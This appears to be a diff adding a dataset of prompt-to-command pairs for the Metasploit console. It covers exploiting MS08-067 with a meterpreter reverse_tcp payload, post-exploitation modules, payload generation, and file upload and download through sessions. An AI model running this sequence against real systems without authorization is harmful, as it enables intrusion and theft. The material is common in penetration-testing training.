@@ -1,0 +1,85 @@
+[CLS] basic metasploit console start [SEP]
+msfconsole
+[SEP]
+
+[CLS] use an exploit module [SEP]
+use exploit/windows/smb/ms08_067_netapi
+[SEP]
+
+[CLS] set options for an exploit [SEP]
+set RHOST 192.168.1.1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+[SEP]
+
+[CLS] run the exploit [SEP]
+exploit
+[SEP]
+
+[CLS] use a post-exploitation module [SEP]
+use post/windows/gather/enum_applications
+[SEP]
+
+[CLS] set session for post-exploitation module [SEP]
+set SESSION 1
+[SEP]
+
+[CLS] run the post-exploitation module [SEP]
+run
+[SEP]
+
+[CLS] search for a module [SEP]
+search type:exploit platform:windows name:netapi
+[SEP]
+
+[CLS] save output to a file [SEP]
+spool /tmp/msf_output.txt
+[SEP]
+
+[CLS] list all exploits [SEP]
+show exploits
+[SEP]
+
+[CLS] list all payloads [SEP]
+show payloads
+[SEP]
+
+[CLS] generate a payload [SEP]
+generate -t exe -f /tmp/payload.exe
+[SEP]
+
+[CLS] use an auxiliary module [SEP]
+use auxiliary/scanner/smb/smb_version
+[SEP]
+
+[CLS] set RHOSTS for auxiliary module [SEP]
+set RHOSTS 192.168.1.0/24
+[SEP]
+
+[CLS] run the auxiliary module [SEP]
+run
+[SEP]
+
+[CLS] background a session [SEP]
+background
+[SEP]
+
+[CLS] list active sessions [SEP]
+sessions
+[SEP]
+
+[CLS] interact with a session [SEP]
+sessions -i 1
+[SEP]
+
+[CLS] upload a file to a session [SEP]
+upload /tmp/file.txt C:\\Users\\Public\\
+[SEP]
+
+[CLS] download a file from a session [SEP]
+download C:\\Users\\Public\\file.txt /tmp/
+[SEP]
+
+[CLS] run a meterpreter script [SEP]
+run post/windows/manage/migrate
+[SEP]
